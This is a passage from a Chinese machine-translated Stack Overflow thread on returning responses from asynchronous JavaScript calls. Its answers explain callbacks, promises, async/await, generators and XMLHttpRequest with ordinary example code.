 r = new RegExp(str);
} catch(error) {
  // no good
} 
```

`SyntaxError`当字符串与格式正确的正则表达式不匹配时，您会得到一个。

如果你想测试一个字符串，它的值就像一个编译的正则表达式（例如`"/\b=\b/g"`，你可以使用这样的函数：

```
function checkCompiledRegex(str) {
  if (str[0]!='/') return false;
  var i = str.lastIndexOf('/');
  if (i<=0) return false;
  try {
    new RegExp(str.slice(1, i), str.slice(i+1));
  } catch(error) {
    return false;
  }
  return true;
} 
```

# javascript - 如何从异步调用返回响应

> ID：14220321
> 
> 赞同：6298
> 
> 时间：2013-01-08T17:06:14.013
> 
> 标签：javascript, ajax, asynchronous

我有一个`foo`发出异步请求的函数。如何返回响应/结果`foo`？

我正在尝试从回调中返回值，并将结果分配给函数内部的局部变量并返回该变量，但这些方式都没有真正返回响应（它们都返回`undefined`或任何变量的初始值`result`是）。

**接受回调的异步函数示例**（使用 jQuery 的`ajax`函数）

```
function foo() {
    var result;

    $.ajax({
        url: '...',
        success: function(response) {
            result = response;
            // return response; // <- I tried that one as well
        }
    });

    return result; // It always returns `undefined`
} 
```

**使用 Node.js 的示例：**

```
function foo() {
    var result;

    fs.readFile("path/to/file", function(err, data) {
        result = data;
        // return data; // <- I tried that one as well
    });

    return result; // It always returns `undefined`
} 
```

**`then`使用承诺块的示例：**

```
function foo() {
    var result;

    fetch(url).then(function(response) {
        result = response;
        // return response; // <- I tried that one as well
    });

    return result; // It always returns `undefined`
} 
```

* * *

## 回答 #1

> 赞同：6302
> 
> 时间：2013-01-08T17:06:14.013

> *→ 有关不同示例的异步行为的更一般解释，请参阅* [为什么我的变量在我在函数内部修改后没有改变？- 异步代码参考](https://stackoverflow.com/q/23667086/218196)
> 
> *→ 如果您已经了解问题，请跳至以下可能的解决方案。*

# 问题

[Ajax](https://en.wikipedia.org/wiki/Ajax_(programming))中的**A**代表[**异步**](https://www.merriam-webster.com/dictionary/asynchronous)。这意味着发送请求（或者更确切地说是接收响应）从正常的执行流程中取出。在您的示例中，立即返回，并且在您作为回调传递的函数甚至被调用之前执行下一条语句。[](https://www.merriam-webster.com/dictionary/asynchronous)**`$.ajax``return result;``success`**

 **这是一个类比，它有望使同步流和异步流之间的区别更加清晰：

## 同步

想象一下，您给朋友打了个电话，请他为您查找一些东西。虽然这可能需要一段时间，但您在电话上等待并凝视空间，直到您的朋友给您所需的答案。

当您进行包含“正常”代码的函数调用时，也会发生同样的情况：

```
function findItem() {
    var item;
    while(item_not_found) {
        // search
    }
    return item;
}

var item = findItem();

// Do something with item
doSomethingElse(); 
```

尽管`findItem`可能需要很长时间才能执行，但后面的任何代码`var item = findItem();`都必须*等到*函数返回结果。

## 异步

你出于同样的原因再次打电话给你的朋友。但是这次你告诉他你有事，他应该用你的手机*给你回电话。*你挂断电话，离开家，做你打算做的任何事情。一旦你的朋友给你回电话，你就在处理他给你的信息。

这正是您执行 Ajax 请求时发生的情况。

```
findItem(function(item) {
    // Do something with the item
});
doSomethingElse(); 
```

不是等待响应，而是立即继续执行，并执行 Ajax 调用之后的语句。为了最终获得响应，您提供了一个在收到响应后调用的函数，即*回调*（注意什么？*回调*？）。在调用回调之前执行该调用之后的任何语句。

* * *

# 解决方案

**拥抱 JavaScript 的异步特性！**虽然某些异步操作提供同步对应物（“Ajax”也是如此），但通常不鼓励使用它们，尤其是在浏览器上下文中。

你问为什么不好？

JavaScript 在浏览器的 UI 线程中运行，任何长时间运行的进程都会锁定 UI，使其无响应。此外，JavaScript 的执行时间有一个上限，浏览器会询问用户是否继续执行。

所有这些都会导致非常糟糕的用户体验。用户将无法判断一切是否正常。此外，对于连接速度较慢的用户，效果会更差。

在下文中，我们将研究三种不同的解决方案，它们都建立在彼此之上：

*   **Promises with`async/await`** (ES2017+, 如果你使用转译器或再生器，在旧版浏览器中可用)
*   **回调**（在节点中流行）
*   **Promises with`then()`** (ES2015+, 如果你使用许多 Promise 库之一，则在旧浏览器中可用)

**所有这三个都在当前浏览器和节点 7+ 中可用。**

* * *

## ES2017+：承诺与[`async/await`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function)

2017 年发布的 ECMAScript 版本引入了对异步函数的*语法级支持*。`async`在and的帮助下`await`，您可以以“同步风格”编写异步。代码仍然是异步的，但更容易阅读/理解。

`async/await`建立在 Promise 之上：一个`async`函数总是返回一个 Promise。`await`“解包”一个promise，或者导致promise被解析的值，或者如果promise被拒绝则抛出一个错误。

**重要提示：**您只能在函数`await`内部使用`async`。`await`目前，尚不支持顶级，因此您可能必须创建一个异步 IIFE（[立即调用函数表达式](https://en.wikipedia.org/wiki/Immediately_invoked_function_expression)）来启动`async`上下文。

您可以阅读有关MDN 的[`async`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function)更多信息。[`await`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await)

这是一个详细说明上述*延迟*函数的示例`findItem()`：

```
// Using 'superagent' which will return a promise.
var superagent = require('superagent')

// This is isn't declared as `async` because it already returns a promise
function delay() {
  // `delay` returns a promise
  return new Promise(function(resolve, reject) {
    // Only `delay` is able to resolve or reject the promise
    setTimeout(function() {
      resolve(42); // After 3 seconds, resolve the promise with value 42
    }, 3000);
  });
}

async function getAllBooks() {
  try {
    // GET a list of book IDs of the current user
    var bookIDs = await superagent.get('/user/books');
    // wait for 3 seconds (just for the sake of this example)
    await delay();
    // GET information about each book
    return await superagent.get('/books/ids='+JSON.stringify(bookIDs));
  } catch(error) {
    // If any of the awaited promises was rejected, this catch block
    // would catch the rejection reason
    return null;
  }
}

// Start an IIFE to use `await` at the top level
(async function(){
  let books = await getAllBooks();
  console.log(books);
})(); 
```

当前[浏览器](https://kangax.github.io/compat-table/es2016plus/#test-async_functions)和[节点](http://node.green/#ES2017-features-async-functions)版本支持`async/await`. 您还可以通过在[regenerator](https://github.com/facebook/regenerator)（或使用 regenerator 的工具，例如[Babel](https://babeljs.io/)）的帮助下将代码转换为 ES5 来支持旧环境。

* * *

## 让函数接受*回调*

回调是将函数 1 传递给函数 2。函数 2 可以在函数 1 准备就绪时调用它。在异步进程的上下文中，只要异步进程完成，就会调用回调。通常，结果被传递给回调。

在问题示例中，您可以`foo`接受回调并将其用作`success`回调。所以这

```
var result = foo();
// Code that depends on 'result' 
```

变成

```
foo(function(result) {
    // Code that depends on 'result'
}); 
```

在这里，我们定义了函数“内联”，但您可以传递任何函数引用：

```
function myCallback(result) {
    // Code that depends on 'result'
}

foo(myCallback); 
```

`foo`本身定义如下：

```
function foo(callback) {
    $.ajax({
        // ...
        success: callback
    });
} 
```

`callback`将引用`foo`我们调用时传递给它的函数，并将其传递给`success`. 即，一旦 Ajax 请求成功，`$.ajax`将调用`callback`并将响应传递给回调（可以用 引用`result`，因为这是我们定义回调的方式）。

您还可以在将响应传递给回调之前对其进行处理：

```
function foo(callback) {
    $.ajax({
        // ...
        success: function(response) {
            // For example, filter the response
            callback(filtered_response);
        }
    });
} 
```

使用回调编写代码比看起来更容易。毕竟，浏览器中的 JavaScript 是高度事件驱动的（DOM 事件）。接收 Ajax 响应只不过是一个事件。当您必须使用第三方代码时可能会出现困难，但大多数问题都可以通过考虑应用程序流程来解决。

* * *

## ES2015+：使用[then() 进行承诺](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)

[Promise API](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)是 ECMAScript 6 (ES2015) 的一个新特性，但它已经有很好的浏览[器支持](http://caniuse.com/#feat=promises "我可以用吗")。还有许多库实现了标准 Promises API 并提供了额外的方法来简化异步函数的使用和组合（例如[bluebird](https://github.com/petkaantonov/bluebird)）。

Promise 是*未来*值的容器。当 Promise 接收到该值（它被*解决*）或被取消（*被拒绝*）时，它会通知所有想要访问该值的“侦听器”。

与普通回调相比，它们的优势在于它们允许您解耦代码并且它们更易于编写。

下面是一个使用 Promise 的例子：

```
function delay() {
  // `delay` returns a promise
  return new Promise(function(resolve, reject) {
    // Only `delay` is able to resolve or reject the promise
    setTimeout(function() {
      resolve(42); // After 3 seconds, resolve the promise with value 42
    }, 3000);
  });
}

delay()
  .then(function(v) { // `delay` returns a promise
    console.log(v); // Log the value once it is resolved
  })
  .catch(function(v) {
    // Or do something else if it is rejected
    // (it would not happen in this example, since `reject` is not called).
  });
```

```
.as-console-wrapper { max-height: 100% !important; top: 0; }
```

应用到我们的 Ajax 调用中，我们可以使用这样的 Promise：

```
function ajax(url) {
  return new Promise(function(resolve, reject) {
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
      resolve(this.responseText);
    };
    xhr.onerror = reject;
    xhr.open('GET', url);
    xhr.send();
  });
}

ajax("https://jsonplaceholder.typicode.com/todos/1")
  .then(function(result) {
    console.log(result); // Code depending on result
  })
  .catch(function() {
    // An error occurred
  });
```

```
.as-console-wrapper { max-height: 100% !important; top: 0; }
```

描述承诺提供的所有优势超出了这个答案的范围，但如果你编写新代码，你应该认真考虑它们。它们为您的代码提供了很好的抽象和分离。

有关 Promises 的更多信息：[HTML5 Rocks - JavaScript Promises](http://www.html5rocks.com/en/tutorials/es6/promises/)。

### 旁注：jQuery 的延迟对象

[延迟对象](https://stackoverflow.com/questions/4866721/what-are-deferred-objects)是 jQuery 对 Promise 的自定义实现（在 Promise API 标准化之前）。它们的行为几乎像 Promise，但暴露了稍微不同的 API。

jQuery 的每个 Ajax 方法都已经返回了一个“延迟对象”（实际上是一个延迟对象的承诺），您可以从函数中返回它：

```
function ajax() {
    return $.ajax(...);
}

ajax().done(function(result) {
    // Code depending on result
}).fail(function() {
    // An error occurred
}); 
```

### 旁注：承诺陷阱

请记住，承诺和延迟对象只是未来值的*容器*，它们不是值本身。例如，假设您有以下内容：

```
function checkPassword() {
    return $.ajax({
        url: '/password',
        data: {
            username: $('#username').val(),
            password: $('#password').val()
        },
        type: 'POST',
        dataType: 'json'
    });
}

if (checkPassword()) {
    // Tell the user they're logged in
} 
```

此代码误解了上述异步问题。具体来说，`$.ajax()`在检查服务器上的“/密码”页面时不会冻结代码 - 它向服务器发送请求，在等待时，它会立即返回一个 jQuery Ajax Deferred 对象，而不是来自服务器的响应。这意味着该`if`语句将始终获取此 Deferred 对象，将其视为`true`，并像用户登录一样继续进行。不好。

但修复很简单：

```
checkPassword()
.done(function(r) {
    if (r) {
        // Tell the user they're logged in
    } else {
        // Tell the user their password was bad
    }
})
.fail(function(x) {
    // Tell the user something bad happened
}); 
```

* * *

## 不推荐：同步“Ajax”调用

正如我所提到的，一些（！）异步操作具有同步对应物。我不提倡使用它们，但为了完整起见，以下是执行同步调用的方式：

### 没有 jQuery

如果您直接使用[`XMLHttpRequest`](https://xhr.spec.whatwg.org/)对象，请`false`作为第三个参数传递给[`.open`](https://xhr.spec.whatwg.org/#the-open()-method).

### jQuery

如果您使用[jQuery](http://api.jquery.com/jQuery.ajax/)，您可以将`async`选项设置为`false`. 请注意，此选项自 jQuery 1.8 起已*弃用。*然后，您仍然可以使用`success`回调或访问[jqXHR 对象](http://api.jquery.com/jQuery.ajax/#jqXHR)`responseText`的属性：

```
function foo() {
    var jqXHR = $.ajax({
        //...
        async: false
    });
    return jqXHR.responseText;
} 
```

如果您使用任何其他 jQuery Ajax 方法，例如`$.get`,`$.getJSON`等，则必须将其更改为`$.ajax`（因为您只能将配置参数传递给`$.ajax`）。

**小心！**无法发出同步[JSONP](https://stackoverflow.com/questions/2067472/please-explain-jsonp)请求。JSONP 就其本质而言始终是异步的（甚至不考虑此选项的另一个原因）。

* * *

## 回答 #2

> 赞同：1167
> 
> 时间：2013-05-29T23:30:56.593

# 如果您*没有*在代码中使用 jQuery，那么这个答案适合您

你的代码应该是这样的：

```
function foo() {
    var httpRequest = new XMLHttpRequest();
    httpRequest.open('GET', "/echo/json");
    httpRequest.send();
    return httpRequest.responseText;
}

var result = foo(); // Always ends up being 'undefined' 
```

[Felix Kling 为使用 jQuery for AJAX 的人写了一个很好](https://stackoverflow.com/questions/14220321/how-do-i-return-the-response-from-an-asynchronous-call/14220323#14220323)的答案，但我决定为不使用 jQuery 的人提供一个替代方案。

（[注意，对于那些使用新`fetch`API、Angular 或 Promise 的人，我在下面添加了另一个答案](https://stackoverflow.com/a/30180679/1348195)）

* * *

# 你所面临的

这是另一个答案中“问题解释”的简短摘要，如果您在阅读后不确定，请阅读。

AJAX 中的**A**代表**异步**。这意味着发送请求（或者更确切地说是接收响应）从正常的执行流程中取出。在您的示例中，立即返回，并且在您作为回调传递的函数甚至被调用之前执行[`.send`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest#send%28%29)下一条语句。`return result;``success`

这意味着当您返回时，您定义的侦听器尚未执行，这意味着您返回的值尚未定义。

这是一个简单的类比：

```
function getFive(){
    var a;
    setTimeout(function(){
         a=5;
    },10);
    return a;
} 
```

[（小提琴）](http://jsfiddle.net/7RK3k/)

`a`返回的值是`undefined`因为该`a=5`部分尚未执行。AJAX 的行为是这样的，您在服务器有机会告诉您的浏览器该值是什么之前返回该值。

这个问题的一种可能的解决方案是*重新*编码，告诉你的程序在计算完成后要做什么。

```
function onComplete(a){ // When the code completes, do this
    alert(a);
}

function getFive(whenDone){
    var a;
    setTimeout(function(){
         a=5;
         whenDone(a);
    },10);
} 
```

这称为[CPS](http://en.wikipedia.org/wiki/Continuation-passing_style)。基本上，我们传递`getFive`一个动作完成时执行，我们告诉我们的代码如何在事件完成时做出反应（比如我们的 AJAX 调用，或者在这种情况下是超时）。

用法是：

```
getFive(onComplete); 
```

这应该在屏幕上提醒“5”。[（小提琴）](http://jsfiddle.net/PAjZR/)。

# 可能的解决方案

基本上有两种方法可以解决这个问题：

1.  使 AJAX 调用同步（我们称之为 SJAX）。
2.  重构您的代码以与回调一起正常工作。

## 1\. 同步 AJAX - 不要这样做！

至于同步AJAX，**千万别搞！**Felix 的回答引发了一些令人信服的论点，说明为什么这是一个坏主意。总而言之，它会冻结用户的浏览器，直到服务器返回响应并造成非常糟糕的用户体验。这是从 MDN 摘录的另一个简短摘要，说明了原因：

> XMLHttpRequest 支持同步和异步通信。然而，一般来说，出于性能原因，异步请求应优先于同步请求。
> 
> 简而言之，同步请求会阻塞代码的执行……这可能会导致严重的问题……

如果你*必须*这样做，你可以传递一个标志。[方法如下](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Synchronous_and_Asynchronous_Requests#Synchronous_request)：

```
var request = new XMLHttpRequest();
request.open('GET', 'yourURL', false);  // `false` makes the request synchronous
request.send(null);

if (request.status === 200) {// That's HTTP for 'ok'
  console.log(request.responseText);
} 
```

## 2.重构代码

让您的函数接受回调。在示例代码`foo`中可以接受回调。我们将告诉我们的代码在完成时如何*做出反应*`foo`。

所以：

```
var result = foo();
// Code that depends on `result` goes here 
```

变成：

```
foo(function(result) {
    // Code that depends on `result`
}); 
```

这里我们传递了一个匿名函数，但我们也可以轻松传递对现有函数的引用，使其看起来像：

```
function myHandler(result) {
    // Code that depends on `result`
}
foo(myHandler); 
```

有关如何完成此类回调设计的更多详细信息，请查看 Felix 的答案。

现在，让我们定义 foo 本身以相应地采取行动

```
function foo(callback) {
    var httpRequest = new XMLHttpRequest();
    httpRequest.onload = function(){ // When the request is loaded
       callback(httpRequest.responseText);// We're calling our method
    };
    httpRequest.open('GET', "/echo/json");
    httpRequest.send();
} 
```

[（小提琴）](http://jsfiddle.net/DAcWT/)

我们现在让我们的*foo*函数接受在 AJAX 成功完成时运行的操作。我们可以通过检查响应状态是否不是 200 并采取相应措施（创建一个失败处理程序等）来进一步扩展它。它有效地解决了我们的问题。

如果您仍然难以理解这一点，[请阅读 MDN 上的 AJAX 入门指南](https://developer.mozilla.org/en-US/docs/AJAX/Getting_Started)。

* * *

## 回答 #3

> 赞同：428
> 
> 时间：2013-08-19T08:06:04.867

**[XMLHttpRequest](http://en.wikipedia.org/wiki/XMLHttpRequest) 2**（首先，阅读[Benjamin Gruenbaum](https://stackoverflow.com/a/16825593/19068)和[Felix Kling](https://stackoverflow.com/a/14220323/19068)的答案）

如果你不使用 jQuery 并且想要一个在现代浏览器和移动浏览器中工作的漂亮的简短 XMLHttpRequest 2，我建议以这种方式使用它：

```
function ajax(a, b, c){ // URL, callback, just a placeholder
  c = new XMLHttpRequest;
  c.open('GET', a);
  c.onload = b;
  c.send()
} 
```

如你看到的：

1.  它比列出的所有其他功能都短。
2.  回调是直接设置的（因此没有额外的不必要的闭包）。
3.  它使用新的 onload（因此您不必检查 readystate && 状态）
4.  还有一些其他情况，我不记得了，这让 XMLHttpRequest 1 很烦人。

有两种方法可以获取此 Ajax 调用的响应（三种使用 XMLHttpRequest var 名称）：

最简单的：

```
this.response 
```

或者如果由于某种原因你`bind()`回调一个类：

```
e.target.response 
```

例子：

```
function callback(e){
  console.log(this.response);
}
ajax('URL', callback); 
```

或者（上面一个更好的匿名函数总是一个问题）：

```
ajax('URL', function(e){console.log(this.response)}); 
```

没有什么比这更容易的了。

现在可能有人会说最好使用onreadystatechange 甚至XMLHttpRequest 变量名。那是错误的。

查看[XMLHttpRequest 高级功能](http://caniuse.com/xhr2)。

它支持所有*现代浏览器。而且我可以确认，自从 XMLHttpRequest 2 创建以来，我一直在使用这种方法。在我使用的任何浏览器中，我从来没有遇到过任何类型的问题。

onreadystatechange 仅在您想要获取状态 2 的标头时才有用。

使用`XMLHttpRequest`变量名是另一个大错误，因为您需要在 onload/oreadystatechange 闭包内执行回调，否则您将丢失它。

* * *

[现在，如果您想要使用POST](https://en.wikipedia.org/wiki/POST_%28HTTP%29)和 FormData进行更复杂的操作，您可以轻松扩展此功能：

```
function x(a, b, e, d, c){ // URL, callback, method, formdata or {key:val},placeholder
  c = new XMLHttpRequest;
  c.open(e||'get', a);
  c.onload = b;
  c.send(d||null)
} 
```

再次......这是一个非常短的函数，但它确实[GET](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods)和 POST。

使用示例：

```
x(url, callback); // By default it's GET so no need to set
x(url, callback, 'post', {'key': 'val'}); // No need to set POST data 
```

或者传递一个完整的表单元素 ( `document.getElementsByTagName('form')[0]`)：

```
var fd = new FormData(form);
x(url, callback, 'post', fd); 
```

或者设置一些自定义值：

```
var fd = new FormData();
fd.append('key', 'val')
x(url, callback, 'post', fd); 
```

如您所见，我没有实现同步......这是一件坏事。

话虽如此......为什么我们不做简单的方法呢？

* * *

正如评论中提到的，使用错误 && 同步确实完全打破了答案的重点。哪个是正确使用 Ajax 的好方法？

*错误处理程序*

```
function x(a, b, e, d, c){ // URL, callback, method, formdata or {key:val}, placeholder
  c = new XMLHttpRequest;
  c.open(e||'get', a);
  c.onload = b;
  c.onerror = error;
  c.send(d||null)
}

function error(e){
  console.log('--Error--', this.type);
  console.log('this: ', this);
  console.log('Event: ', e)
}
function displayAjax(e){
  console.log(e, this);
}
x('WRONGURL', displayAjax); 
```

在上面的脚本中，您有一个静态定义的错误处理程序，因此它不会损害功能。错误处理程序也可以用于其他功能。

但要真正摆脱错误，**唯一**的方法是编写错误的 URL，在这种情况下，每个浏览器都会抛出错误。

如果您设置自定义标头、将 responseType 设置为 blob 数组缓冲区或其他任何内容，错误处理程序可能会很有用...

即使您将 'POSTAPAPAP' 作为方法传递，它也不会引发错误。

即使您将 'fdggdgilfdghfldj' 作为 formdata 传递，它也不会引发错误。

在第一种情况下，错误在as的`displayAjax()`下方。`this.statusText``Method not Allowed`

在第二种情况下，它可以正常工作。如果您传递了正确的发布数据，您必须在服务器端进行检查。

不允许跨域自动抛出错误。

在错误响应中，没有任何错误代码。

只有`this.type`which 设置为*error*。

如果您完全无法控制错误，为什么还要添加错误处理程序？大多数错误都在回调函数的 this 中返回`displayAjax()`。

所以：如果您能够正确复制和粘贴 URL，则不需要进行错误检查。;)

*PS：作为第一个测试，我写了 x('x', displayAjax)...，它完全得到了响应...？？？所以我检查了HTML所在的文件夹，有一个名为'x.xml'的文件。因此，即使您忘记了文件的扩展名 XMLHttpRequest 2 也会找到它*。我笑了

* * *

*同步读取文件*

**不要那样做。**

如果您想暂时阻止浏览器，请`.txt`同步加载一个不错的大文件。

```
function omg(a, c){ // URL
  c = new XMLHttpRequest;
  c.open('GET', a, true);
  c.send();
  return c; // Or c.response
} 
```

现在你可以做

```
 var res = omg('thisIsGonnaBlockThePage.txt'); 
```

没有其他方法可以以非异步方式执行此操作。（是的，使用 setTimeout 循环......但认真吗？）

另一点是...如果您使用 API 或只是您自己的列表文件或任何您总是为每个请求使用不同功能的东西...

仅当您有一个页面始终加载相同的 XML/JSON 或任何您只需要一个功能的页面时。在这种情况下，稍微修改 Ajax 函数并将 b 替换为您的特殊函数。

* * *

以上功能为基本使用。

如果要*扩展*功能...

是的你可以。

我使用了很多 API，我集成到每个 HTML 页面的第一个函数是这个答案中的第一个 Ajax 函数，只有 GET ......

但是你可以用 XMLHttpRequest 2 做很多事情：

我制作了一个下载管理器（使用简历、文件阅读器和文件系统两侧的范围）、使用画布的各种图像大小调整器转换器、使用 base64images 填充 Web SQL 数据库等等......

但在这些情况下，您应该只为此目的创建一个函数……有时您需要一个 blob、数组缓冲区、您可以设置标题、覆盖 mimetype 等等……

但这里的问题是如何返回 Ajax 响应......（我添加了一个简单的方法。）

* * *

## 回答 #4

> 赞同：350
> 
> 时间：2015-05-12T02:22:57.533

## 如果您使用的是 Promise，那么这个答案适合您。

这意味着 AngularJS、jQuery（带延迟）、本机[XHR](https://en.wikipedia.org/wiki/XMLHttpRequest)的替换（获取）、[Ember.js](https://en.wikipedia.org/wiki/Ember.js)、[Backbone.js](https://en.wikipedia.org/wiki/Backbone.js)的保存或任何返回承诺的[Node.js库。](https://en.wikipedia.org/wiki/Node.js)

你的代码应该是这样的：

```
function foo() {
    var data;
    // Or $.get(...).then, or request(...).then, or query(...).then
    fetch("/echo/json").then(function(response){
        data = response.json();
    });
    return data;
}

var result = foo(); // 'result' is always undefined no matter what. 
```

[Felix Kling 为使用带有 Ajax 回调的 jQuery 的人们编写了一个很好](https://stackoverflow.com/questions/14220321/how-do-i-return-the-response-from-an-asynchronous-call/14220323#14220323)的答案。我有一个原生 XHR 的答案。这个答案适用于前端或后端的 Promise 的通用用法。

* * *

## 核心问题

浏览器和服务器上的 JavaScript 并发模型与 Node.js/io.js 是*异步*和*反应式*的。

每当您调用返回承诺的方法时，`then`处理程序*总是*异步执行 - 即在它们下面的代码**之后**不在`.then`处理程序中。

这意味着当您返回您定义`data`的`then`处理程序时尚未执行。这反过来意味着您返回的值没有及时设置为正确的值。

这是这个问题的一个简单类比：

```
 function getFive(){
        var data;
        setTimeout(function(){ // Set a timer for one second in the future
           data = 5; // After a second, do this
        }, 1000);
        return data;
    }
    document.body.innerHTML = getFive(); // `undefined` here and not 5
```

的值`data`是`undefined`因为该`data = 5`部分尚未执行。它可能会在一秒钟内执行，但到那时它与返回值无关。

由于操作尚未发生（Ajax、服务器调用、I/O 和计时器），您在请求有机会告诉您的代码该值是什么之前返回该值。

这个问题的一种可能的解决方案是*重新*编码，告诉你的程序在计算完成后要做什么。Promise 通过本质上是临时的（时间敏感的）来积极地实现这一点。

### 快速回顾承诺

Promise 是一个*随时间变化的值*。Promise 有状态。它们以没有价值的待处理开始，并且可以解决：

*   **完成**意味着计算成功完成。
*   **拒绝**意味着计算失败。

Promise 只能更改*一次*状态，之后它将永远保持相同的状态。您可以将`then`处理程序附加到 Promise 以提取它们的值并处理错误。`then`处理程序允许[链接](https://stackoverflow.com/questions/22539815/arent-promises-just-callbacks)调用。Promise 是通过[使用返回它们的 API](https://stackoverflow.com/questions/22519784/how-do-i-convert-an-existing-callback-api-to-promises)创建的。例如，更现代的 Ajax 替代`fetch`或 jQuery 的`$.get`返回承诺。

当我们调用`.then`一个 Promise 并从中*返回*一些东西时——我们得到一个*处理后的值的 Promise*。如果我们兑现另一个承诺，我们会得到惊人的东西，但让我们抓住我们的马。

### 带着承诺

让我们看看如何用 Promise 解决上述问题。首先，让我们通过使用[Promise 构造函数](https://developer.mozilla.org/en-US/docs/Mozilla/JavaScript_code_modules/Promise.jsm/Promise)创建延迟函数来展示我们对上述承诺状态的理解：

```
function delay(ms){ // Takes amount of milliseconds
    // Returns a new promise
    return new Promise(function(resolve, reject){
        setTimeout(function(){ // When the time is up,
            resolve(); // change the promise to the fulfilled state
        }, ms);
    });
} 
```

现在，在我们[将 setTimeout 转换](http://stackoverflow.com/questions/22519784/how-do-i-convert-an-existing-callback-api-to-promises)为使用 Promise 之后，我们可以使用`then`它来计数：

```
function delay(ms){ // Takes amount of milliseconds
  // Returns a new promise
  return new Promise(function(resolve, reject){
    setTimeout(function(){ // When the time is up,
      resolve(); // change the promise to the fulfilled state
    }, ms);
  });
}

function getFive(){
  // We're RETURNING the promise. Remember, a promise is a wrapper over our value
  return delay(100).then(function(){ // When the promise is ready,
      return 5; // return the value 5\. Promises are all about return values
  })
}
// We _have_ to wrap it like this in the call site, and we can't access the plain value
getFive().then(function(five){
   document.body.innerHTML = five;
});
```

基本上，我们不是返回一个由于并发模型而无法执行的*值，而是返回一个**包装器*，用于我们可以*用*`then`. 它就像一个可以打开的盒子`then`。

### 应用这个

这与您的原始 API 调用相同，您可以：

```
function foo() {
    // RETURN the promise
    return fetch("/echo/json").then(function(response){
        return response.json(); // Process it inside the `then`
    });
}

foo().then(function(response){
    // Access the value inside the `then`
}) 
```

所以这同样有效。我们已经知道我们不能从已经异步的调用中返回值，但是我们可以使用 Promise 并链接它们来执行处理。我们现在知道如何从异步调用返回响应。

## ES2015 (ES6)

ES6 引入了[生成器](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function*)，它们是可以在中间返回然后恢复它们所在点的函数。这通常对序列很有用，例如：

```
function* foo(){ // Notice the star. This is ES6, so new browsers, Nodes.js, and io.js only
    yield 1;
    yield 2;
    while(true) yield 3;
} 
```

是一个函数，它在可以迭代的序列上返回一个*迭代器。*`1,2,3,3,3,3,....`虽然这本身很有趣并且为很多可能性打开了空间，但有一个特别有趣的案例。

如果我们生成的序列是一系列动作而不是数字 - 我们可以在产生动作时暂停函数并在恢复函数之前等待它。因此，我们需要一系列*未来*值，而不是数字序列——即：promise。

这有点棘手，但非常强大的技巧让我们以同步的方式编写异步代码。有几个“跑步者”可以为你做这件事。写一个是短短的几行代码，但这超出了这个答案的范围。我将在`Promise.coroutine`这里使用 Bluebird，但还有其他包装器，例如`co`or `Q.async`。

```
var foo = coroutine(function*(){
    var data = yield fetch("/echo/json"); // Notice the yield
    // The code here only executes _after_ the request is done
    return data.json(); // 'data' is defined
}); 
```

此方法本身返回一个 Promise，我们可以从其他协程中使用它。例如：

```
var main = coroutine(function*(){
   var bar = yield foo(); // Wait our earlier coroutine. It returns a promise
   // The server call is done here, and the code below executes when done
   var baz = yield fetch("/api/users/" + bar.userid); // Depends on foo's result
   console.log(baz); // Runs after both requests are done
});
main(); 
```

## ES2016 (ES7)

在 ES7 中，这被进一步标准化。现在有几个提议，但你可以在所有这些提议中`await`做出承诺。`async`通过添加and`await`关键字，这只是上面 ES6 提案的“糖”（更好的语法） 。制作上面的例子：

```
async function foo(){
    var data = await fetch("/echo/json"); // Notice the await
    // code here only executes _after_ the request is done
    return data.json(); // 'data' is defined
} 
```

它仍然返回一个相同的承诺:)

* * *

## 回答 #5

> 赞同：276
> 
> 时间：2014-05-23T02:05:01.057

您错误地使用了 Ajax。这个想法不是让它返回任何东西，而是将数据交给一个叫做回调函数的东西，它处理数据。

那是：

```
function handleData( responseData ) {

    // Do what you want with the data
    console.log(responseData);
}

$.ajax({
    url: "hi.php",
    ...
    success: function ( data, status, XHR ) {
        handleData(data);
    }
}); 
```

在提交处理程序中返回任何内容都不会做任何事情。相反，你必须要么交出数据，要么直接在成功函数中做你想做的事。

* * *

## 回答 #6

> 赞同：265
> 
> 时间：2016-08-11T14:17:36.010

我会用一个看起来很可怕的手绘漫画来回答。`result`第二张图片是`undefined`您的代码示例中的原因。

[![在此处输入图像描述](../Images/8294cc9ebc1b373c3230e34e340f5004.png)](https://i.imgur.com/v5ksbBC.jpg)

* * *

## 回答 #7

> 赞同：256
> 
> 时间：2014-02-18T18:58:37.407

最简单的解决方案是创建一个 JavaScript 函数并为 Ajax`success`回调调用它。

```
function callServerAsync(){
    $.ajax({
        url: '...',
        success: function(response) {

            successCallback(response);
        }
    });
}

function successCallback(responseObj){
    // Do something like read the response and show data
    alert(JSON.stringify(responseObj)); // Only applicable to a JSON response
}

function foo(callback) {

    $.ajax({
        url: '...',
        success: function(response) {
           return callback(null, response);
        }
    });
}

var result = foo(function(err, result){
          if (!err)
           console.log(result);
}); 
```

* * *

## 回答 #8

> 赞同：177
> 
> 时间：2014-08-26T08:11:36.220

## 角 1

使用[AngularJS的人可以使用](http://en.wikipedia.org/wiki/AngularJS)*promises*处理这种情况。

[这里](http://liamkaufman.com/blog/2013/09/09/using-angularjs-promises/)说，

> Promise 可用于取消嵌套异步函数，并允许将多个函数链接在一起。

[你也可以在这里](http://andyshora.com/promises-angularjs-explained-as-cartoon.html)找到一个很好的解释。

在下面提到的[文档](https://docs.angularjs.org/api/ng/service/$q)中找到了一个示例。

```
 promiseB = promiseA.then(
    function onSuccess(result) {
      return result + 1;
    }
    ,function onError(err) {
      // Handle error
    }
  );

 // promiseB will be resolved immediately after promiseA is resolved
 // and its value will be the result of promiseA incremented by 1. 
```

## Angular 2 及更高版本

在 Angular 2 中查看以下示例，但[建议](https://angular-2-training-book.rangle.io/handout/observables/observables_vs_promises.html)在 Angular 2中使用*observables*。

```
 search(term: string) {
     return this.http
       .get(`https://api.spotify.com/v1/search?q=${term}&type=artist`)
       .map((response) => response.json())
       .toPromise();
} 
```

你可以这样消费，

```
search() {
